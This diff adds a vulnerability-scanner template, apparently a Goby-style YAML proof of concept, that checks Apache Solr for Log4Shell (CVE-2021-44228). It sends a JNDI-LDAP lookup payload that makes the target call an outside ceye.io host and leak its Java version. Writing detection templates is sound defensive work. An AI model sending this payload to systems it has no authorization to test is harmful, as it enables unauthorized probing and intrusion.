@@ -1,0 +1,20 @@
+name: Apache Solr Log4j2远程代码执行漏洞（CVE-2021-44228）
+manual: true
+query: APP="Solr"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.amth5e.ceye.io%7D
+      headers:
+        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+      follow_redirects: true
+    expression: response.status == 400 && response.body.bcontains(b"ldap")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: Apache Log4j2是一个Java的日志组件，在特定的版本中由于其启用了lookup功能，从而导致产生远程代码执行漏洞。
+  tags: rce
